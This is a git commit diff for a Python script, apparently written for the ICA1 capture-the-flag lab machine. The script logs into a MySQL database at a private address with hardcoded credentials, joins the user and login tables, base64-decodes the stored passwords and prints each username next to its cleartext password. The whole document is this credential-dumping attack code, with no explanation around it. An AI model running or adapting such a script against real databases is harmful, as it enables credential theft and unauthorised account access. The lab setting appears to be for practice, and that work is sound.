713309f82159cb41c95aeeb211596e5c239d8dd0
badorius <salvadormuntane@gmail.com>
2022-08-04 17:57:52 +0200

    Add python v1 script

--- ica1/python/extract_ica1_os_pass.py
+++ ica1/python/extract_ica1_os_pass.py
@@ -1,33 +1,37 @@
 import mysql.connector
 import base64
 
-try:
-    connection = mysql.connector.connect(host='192.168.1.179',
-                                         database='staff',
-                                         user='qdpmadmin',
-                                         password='UcVQCMQk2STVeS6J')
+
+def mysql_select():
+    try:
+        connection = mysql.connector.connect(host='192.168.1.179',
+                                            database='staff',
+                                            user='qdpmadmin',
+                                            password='UcVQCMQk2STVeS6J')
 
 
+        sql_select_Query = "select * from user join login using (id);"
+        cursor = connection.cursor()
+        cursor.execute(sql_select_Query)
+        # get all records
+        records = cursor.fetchall()
+
+        for row in records:
+            uncpass = base64.b64decode(row[5])
+            print(row[2], uncpass)
+
+    except mysql.connector.Error as e:
+        print("Error reading data from MySQL table", e)
+    finally:
+        if connection.is_connected():
+            connection.close()
+            cursor.close()
+            print("MySQL connection is closed")
 
 
-    sql_select_Query = "select id,password from login"
-    cursor = connection.cursor()
-    cursor.execute(sql_select_Query)
-    # get all records
-    records = cursor.fetchall()
-    print("Total number of rows in table: ", cursor.rowcount)
+def main():
+    mysql_select()
 
-    print("\nPrinting each row")
-    for row in records:
-        print("id = ", row[0], )
-        uncpass = base64.b64decode(row[1])
-        print("password = ", row[1], uncpass)
-        uncpass = base64.b64decode(row[1])
 
-except mysql.connector.Error as e:
-    print("Error reading data from MySQL table", e)
-finally:
-    if connection.is_connected():
-        connection.close()
-        cursor.close()
-        print("MySQL connection is closed")
+if __name__ == "__main__":
+    main()
